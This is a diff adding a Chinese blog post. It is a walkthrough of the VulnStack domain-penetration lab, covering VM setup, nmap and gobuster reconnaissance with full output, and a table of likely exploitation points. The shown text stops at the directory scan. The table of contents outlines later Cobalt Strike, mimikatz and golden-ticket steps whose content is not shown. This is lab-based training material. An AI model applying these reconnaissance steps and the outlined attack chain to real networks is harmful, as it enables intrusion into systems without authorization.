@@ -1,0 +1,400 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="第一个域渗透靶场"><title>红日ATT&amp;CK系列靶场（一）</title><link rel=canonical href=https://ke1thli.github.io/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="红日ATT&CK系列靶场（一）"><meta property='og:description' content="第一个域渗透靶场"><meta property='og:url' content='https://ke1thli.github.io/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='域渗透'><meta property='article:published_time' content='2026-07-21T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-21T00:00:00+00:00'><meta name=twitter:title content="红日ATT&CK系列靶场（一）"><meta name=twitter:description content="第一个域渗透靶场"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#简介>简介</a></li><li><a href=#靶场搭建>靶场搭建</a><ol><li><a href=#机器网络配置>机器网络配置</a></li><li><a href=#启动环境并用统一密码hongrisec2019登陆并修改>启动环境并用统一密码hongrisec@2019登陆并修改</a></li><li><a href=#配置win7外网服务器>配置win7（外网服务器）</a></li><li><a href=#win2003win2008-均开机后修改密码登陆进行就好了>win2003，win2008 均开机后修改密码登陆进行就好了</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a><ol><li><a href=#资产识别>资产识别</a></li><li><a href=#端口分析>端口分析</a></li></ol></li><li><a href=#目录扫描>目录扫描</a><ol><li><a href=#扫描结果>扫描结果</a></li><li><a href=#参数说明>参数说明</a></li></ol></li><li><a href=#web漏洞发现>Web漏洞发现</a><ol><li><a href=#访问-80-端口>访问 80 端口</a></li><li><a href=#phpmyadmin页查看>phpmyadmin页查看</a></li></ol></li></ol></li><li><a href=#内网信息收集以及权限确认>内网信息收集以及权限确认</a></li><li><a href=#内网主机发现>内网主机发现</a></li><li><a href=#确认域环境>确认域环境</a></li><li><a href=#域控身份确认>域控身份确认</a></li><li><a href=#内网拓扑确认>内网拓扑确认</a></li><li><a href=#确认域控是否开放445端口>确认域控是否开放445端口</a></li><li><a href=#尝试横向移动到域控>尝试横向移动到域控</a></li><li><a href=#cs上线>cs上线</a><ol><li><a href=#teamserver部署kali>Teamserver部署（Kali）</a></li><li><a href=#payload生成与执行>Payload生成与执行</a></li><li><a href=#beacon上线确认>Beacon上线确认</a></li></ol></li><li><a href=#凭据抓取与横向移动>凭据抓取与横向移动</a><ol><li><a href=#mimikatz密码抓取>Mimikatz密码抓取</a><ol><li><a href=#等命令执行完毕然后总结获取的信息>等命令执行完毕，然后总结获取的信息</a></li><li><a href=#机器账户凭证>机器账户凭证</a></li><li><a href=#关键总结>关键总结</a></li></ol></li><li><a href=#横向移动到域控>横向移动到域控</a><ol><li><a href=#创建-smb-beacon-并横向移动>创建 SMB Beacon 并横向移动</a></li><li><a href=#成功上线域控-owa权限system>成功上线域控 OWA，权限：SYSTEM</a></li><li><a href=#域控权限获取>域控权限获取</a></li></ol></li><li><a href=#抓取-krbtgt-hash-制作黄金票据>抓取 krbtgt Hash 制作黄金票据</a><ol><li><a href=#在-owa-的-beacon-中执行>在 OWA 的 Beacon 中执行</a></li><li><a href=#制作黄金票据>制作黄金票据</a></li></ol></li></ol></li><li><a href=#使用黄金票据横向移动>使用黄金票据横向移动</a><ol><li><a href=#先注入票据到内存>先注入票据到内存</a></li><li><a href=#然后横向移动到最后一台机器>然后横向移动到最后一台机器</a></li></ol></li><li><a href=#痕迹清除>痕迹清除</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/>红日ATT&amp;CK系列靶场（一）</a></h2><h3 class=article-subtitle>第一个域渗透靶场</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-07-21T00:00:00Z>Tuesday, July 21, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#简介>简介</a></li><li><a href=#靶场搭建>靶场搭建</a><ol><li><a href=#机器网络配置>机器网络配置</a></li><li><a href=#启动环境并用统一密码hongrisec2019登陆并修改>启动环境并用统一密码hongrisec@2019登陆并修改</a></li><li><a href=#配置win7外网服务器>配置win7（外网服务器）</a></li><li><a href=#win2003win2008-均开机后修改密码登陆进行就好了>win2003，win2008 均开机后修改密码登陆进行就好了</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a><ol><li><a href=#资产识别>资产识别</a></li><li><a href=#端口分析>端口分析</a></li></ol></li><li><a href=#目录扫描>目录扫描</a><ol><li><a href=#扫描结果>扫描结果</a></li><li><a href=#参数说明>参数说明</a></li></ol></li><li><a href=#web漏洞发现>Web漏洞发现</a><ol><li><a href=#访问-80-端口>访问 80 端口</a></li><li><a href=#phpmyadmin页查看>phpmyadmin页查看</a></li></ol></li></ol></li><li><a href=#内网信息收集以及权限确认>内网信息收集以及权限确认</a></li><li><a href=#内网主机发现>内网主机发现</a></li><li><a href=#确认域环境>确认域环境</a></li><li><a href=#域控身份确认>域控身份确认</a></li><li><a href=#内网拓扑确认>内网拓扑确认</a></li><li><a href=#确认域控是否开放445端口>确认域控是否开放445端口</a></li><li><a href=#尝试横向移动到域控>尝试横向移动到域控</a></li><li><a href=#cs上线>cs上线</a><ol><li><a href=#teamserver部署kali>Teamserver部署（Kali）</a></li><li><a href=#payload生成与执行>Payload生成与执行</a></li><li><a href=#beacon上线确认>Beacon上线确认</a></li></ol></li><li><a href=#凭据抓取与横向移动>凭据抓取与横向移动</a><ol><li><a href=#mimikatz密码抓取>Mimikatz密码抓取</a><ol><li><a href=#等命令执行完毕然后总结获取的信息>等命令执行完毕，然后总结获取的信息</a></li><li><a href=#机器账户凭证>机器账户凭证</a></li><li><a href=#关键总结>关键总结</a></li></ol></li><li><a href=#横向移动到域控>横向移动到域控</a><ol><li><a href=#创建-smb-beacon-并横向移动>创建 SMB Beacon 并横向移动</a></li><li><a href=#成功上线域控-owa权限system>成功上线域控 OWA，权限：SYSTEM</a></li><li><a href=#域控权限获取>域控权限获取</a></li></ol></li><li><a href=#抓取-krbtgt-hash-制作黄金票据>抓取 krbtgt Hash 制作黄金票据</a><ol><li><a href=#在-owa-的-beacon-中执行>在 OWA 的 Beacon 中执行</a></li><li><a href=#制作黄金票据>制作黄金票据</a></li></ol></li></ol></li><li><a href=#使用黄金票据横向移动>使用黄金票据横向移动</a><ol><li><a href=#先注入票据到内存>先注入票据到内存</a></li><li><a href=#然后横向移动到最后一台机器>然后横向移动到最后一台机器</a></li></ol></li><li><a href=#痕迹清除>痕迹清除</a></li></ol></nav></details></aside><section class=article-content><h1 id=红日红队attck系列靶场一通过记录-第一次接触域渗透和内网横向移动的完整过程>红日红队ATT＆CK系列靶场（一）通过记录-第一次接触域渗透和内网横向移动的完整过程</h1><h2 id=简介>简介</h2><p>红日靶场（VulnStack）是由红日安全团队打造的内网渗透靶场系列，模拟企业域环境，覆盖从外网打点到域控渗透的完整链路。靶场文件可通过安全社区获取。，</p><p>官方下载地址：<a class=link href=http://vulnstack.qiyuanxuetang.net/ target=_blank rel=noopener>http://vulnstack.qiyuanxuetang.net</a> 我打开这个网页，显示server500，最后从别人的网盘下载，这里就不提供了</p><p>下载得到三个压缩包进行解压，分别获得三个虚拟机文件</p><p>vulnstack-win7
+vulnstack-Win2K3 Metasploitable
+vulnstack-winserver08</p><p>网络拓扑图如下
+<img class=gallery-image data-flex-basis=493px data-flex-grow=205 height=603 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345998.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345998_hu_8b2b92bac5264a6.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345998.png 1241w" width=1241></p><h2 id=靶场搭建>靶场搭建</h2><h3 id=机器网络配置>机器网络配置</h3><p>首先根据拓扑图，我们需要了解每台机器对应的哪台设备，服务是什么，然后我们需要模拟内网和外网两个网段</p><p>外网环境就是kali 和 这个Web服务器就是这个win7机器需要均使用nat模式，同时他需要变成网关服务器去连接这个域成员win2机器和域控winserver8机器，也就是说这个Win7机器还需要一张hostonly的网卡，内网环境下这张网卡会作为这三台域内机器的共同网卡，其中域成员和域控只需要这一张网卡</p><p>同时域环境的三台机器初始ip已经设置好为固定的 192.168.52.XXX/24网段，所以新建的vmnet的子网为192.168.52.0</p><div class=table-wrapper><table><thead><tr><th>机器</th><th>ip地址</th></tr></thead><tbody><tr><td>kali</td><td>外网ip10.10.10.10</td></tr><tr><td>Win7</td><td>内网IP：192.168.52.143</td></tr><tr><td>Win2003</td><td>内网IP：192.168.52.141</td></tr><tr><td>Win2008</td><td>内网IP：192.168.52.138</td></tr></tbody></table></div><p>Win7的外网ip最后主机发现再补充</p><h3 id=启动环境并用统一密码hongrisec2019登陆并修改>启动环境并用统一密码hongrisec@2019登陆并修改</h3><h3 id=配置win7外网服务器>配置win7（外网服务器）</h3><ol><li>首次登陆需要重启</li><li>重启之后需要修改密码，这里三台机器我统一改成hongrisec@2026</li><li>关闭防火墙，不然kali不能ping通</li></ol><p>来到 控制面板\系统和安全\Windows 防火墙</p><p>左边有个打开或关闭防火墙</p><p><img class=gallery-image data-flex-basis=474px data-flex-grow=197 height=816 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index1.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index1_hu_1852bf7ffb9ed3b3.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index1_hu_76294ac3708ada65.png 1600w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index1.png 1612w" width=1612></p><p>三个都设置为关闭</p><p>要注意的是</p><p>win7的网络适配器第一张必须是hostonly那种，2才是nat那种，不然nmap主机发现扫不到这张</p><h3 id=win2003win2008-均开机后修改密码登陆进行就好了>win2003，win2008 均开机后修改密码登陆进行就好了</h3><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24 
+</span></span></code></pre></td></tr></table></div></div><p>得到win7这个机器的外网ip为 10.10.10.133</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/RedSun/RedSun1<span class=o>]</span>                                     
+</span></span><span class=line><span class=cl>└─$ nmap -sS -sV -O -p- -sC --min-rate <span class=m>5000</span> 10.10.10.133 -oN nmapscan/portscan.txt                                                      
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-21 09:09 -0400           
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.133                    
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00079s latency<span class=o>)</span>.            
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65524</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>              
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE      VERSION            
+</span></span><span class=line><span class=cl>80/tcp   open  http         Apache httpd 2.4.23 <span class=o>((</span>Win32<span class=o>)</span> OpenSSL/1.0.2j PHP/5.4.45<span class=o>)</span>                     
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: phpStudy <span class=se>\x</span>E6<span class=se>\x</span>8E<span class=se>\x</span>A2<span class=se>\x</span>E9<span class=se>\x</span>92<span class=se>\x</span><span class=m>88</span> <span class=m>2014</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.23 <span class=o>(</span>Win32<span class=o>)</span> OpenSSL/1.0.2j PHP/5.4.45       
+</span></span><span class=line><span class=cl>135/tcp  open  msrpc        Microsoft Windows RPC  
+</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> microsoft-ds <span class=o>(</span>workgroup: GOD<span class=o>)</span>
+</span></span><span class=line><span class=cl>1025/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>1026/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>1027/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>1028/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>1029/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>1033/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>3306/tcp open  mysql        MySQL <span class=o>(</span>unauthorized<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:F3:C1:8B <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Microsoft Windows 2008<span class=p>|</span>7<span class=p>|</span>Vista<span class=p>|</span>8.1
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
+</span></span><span class=line><span class=cl>OS details: Microsoft Windows Vista SP2 or Windows <span class=m>7</span> or Windows Server <span class=m>2008</span> R2 or Windows 8.1
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: Host: STU1<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   2.1: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
+</span></span><span class=line><span class=cl><span class=p>|</span>_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:f3:c1:8b <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
+</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
+</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
+</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -2h40m04s, deviation: 4h37m07s, median: -4s
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2026-07-21T13:10:48
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2026-07-21T12:45:11
+</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> <span class=o>(</span>Windows <span class=m>7</span> Professional 6.1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: stu1
+</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: STU1<span class=se>\x</span><span class=m>00</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Domain name: god.org
+</span></span><span class=line><span class=cl><span class=p>|</span>   Forest name: god.org
+</span></span><span class=line><span class=cl><span class=p>|</span>   FQDN: stu1.god.org
+</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2026-07-21T21:10:48+08:00
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 85.61 seconds
+</span></span></code></pre></td></tr></table></div></div><h4 id=资产识别>资产识别</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>属性</th><th style=text-align:left>信息</th></tr></thead><tbody><tr><td style=text-align:left><strong>目标主机名</strong></td><td style=text-align:left>STU1</td></tr><tr><td style=text-align:left><strong>操作系统</strong></td><td style=text-align:left>Windows 7 Professional SP1</td></tr><tr><td style=text-align:left><strong>域</strong></td><td style=text-align:left>god.org</td></tr><tr><td style=text-align:left><strong>FQDN</strong></td><td style=text-align:left>stu1.god.org</td></tr><tr><td style=text-align:left><strong>工作组/域</strong></td><td style=text-align:left>GOD (域环境)</td></tr></tbody></table></div><h4 id=端口分析>端口分析</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>端口</th><th style=text-align:left>状态</th><th style=text-align:left>服务</th><th style=text-align:left>版本</th><th style=text-align:left>作用</th><th style=text-align:left>潜在利用点</th></tr></thead><tbody><tr><td style=text-align:left><strong>80</strong></td><td style=text-align:left>open</td><td style=text-align:left>http</td><td style=text-align:left>Apache 2.4.23 (Win32) + PHP 5.4.45</td><td style=text-align:left>Web服务</td><td style=text-align:left>phpStudy探针2014，可能存在Web漏洞（phpMyAdmin、弱口令、文件上传等）</td></tr><tr><td style=text-align:left><strong>135</strong></td><td style=text-align:left>open</td><td style=text-align:left>msrpc</td><td style=text-align:left>Microsoft Windows RPC</td><td style=text-align:left>远程过程调用</td><td style=text-align:left>通常配合445/139利用</td></tr><tr><td style=text-align:left><strong>139</strong></td><td style=text-align:left>open</td><td style=text-align:left>netbios-ssn</td><td style=text-align:left>Microsoft Windows netbios-ssn</td><td style=text-align:left>NetBIOS会话服务</td><td style=text-align:left>SMB相关</td></tr><tr><td style=text-align:left><strong>445</strong></td><td style=text-align:left>open</td><td style=text-align:left>microsoft-ds</td><td style=text-align:left>Windows 7 SP1</td><td style=text-align:left>SMB文件共享</td><td style=text-align:left><strong>重点关注：Win7 SP1存在永恒之蓝(MS17-010)等SMB漏洞</strong></td></tr><tr><td style=text-align:left><strong>1025-1029, 1033</strong></td><td style=text-align:left>open</td><td style=text-align:left>msrpc</td><td style=text-align:left>Microsoft Windows RPC</td><td style=text-align:left>动态RPC端口</td><td style=text-align:left>辅助端口</td></tr><tr><td style=text-align:left><strong>3306</strong></td><td style=text-align:left>open</td><td style=text-align:left>mysql</td><td style=text-align:left>MySQL (unauthorized)</td><td style=text-align:left>数据库</td><td style=text-align:left><strong>未授权访问或弱口令</strong>，phpStudy默认MySQL</td></tr></tbody></table></div><h3 id=目录扫描>目录扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>gobuster dir -u http://10.10.10.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip,bak,sql,old,log -t <span class=m>50</span> --no-error -b <span class=m>404</span> <span class=p>|</span> tee dirb/gobuster.txt
